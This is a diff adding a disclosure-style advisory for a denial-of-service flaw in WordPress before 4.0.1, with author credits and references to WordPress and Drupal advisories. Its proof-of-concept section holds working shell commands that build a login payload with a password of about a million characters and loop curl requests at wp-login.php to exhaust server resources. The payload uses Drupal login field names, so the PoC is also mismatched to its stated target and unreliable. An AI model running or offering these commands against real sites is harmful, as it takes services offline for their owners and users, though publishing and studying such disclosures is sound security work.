@@ -1,0 +1,52 @@
+====================================================================
+DESCRIPTION:
+====================================================================
+A vulnerability present in Wordpress < 4.0.1 allows an
+attacker to send specially crafted requests resulting in CPU and memory
+exhaustion. This may lead to the site becoming unavailable or
+unresponsive (denial of service).
+
+====================================================================
+Time Line:
+====================================================================
+
+November 20, 2014 - A Wordpress security update and the security
+advisory is published.
+
+====================================================================
+Proof of Concept:
+====================================================================
+Generate a pyaload and try with a valid user:
+
+echo -n "name=admin&pass=" > valid_user_payload && printf "%s"
+{1..1000000} >> valid_user_payload && echo -n "&op=Log
+in&form_id=user_login" >> valid_user_payload
+
+Perform a Dos with a valid user:
+
+for i in `seq 1 150`; do (curl --data @valid_user_payload
+http://yoursite/wordpress/wp-login.php --silent > /dev/null &); sleep
+0.25; done
+
+====================================================================
+Authors:
+====================================================================
+
+-- Javer Nieto -- http://www.behindthefirewalls.com
+-- Andres Rojas -- http://www.devconsole.info
+
+====================================================================
+References:
+====================================================================
+
+* https://wordpress.org/news/2014/11/wordpress-4-0-1/
+
+* https://www.drupal.org/SA-CORE-2014-006
+
+*
+http://www.behindthefirewalls.com/2014/11/wordpress-denial-of-service-responsible-disclosure.html
+
+*
+http://www.behindthefirewalls.com/2014/11/drupal-denial-of-service-responsible-disclosure.html
+
+* http://www.devconsole.info/?p=1050
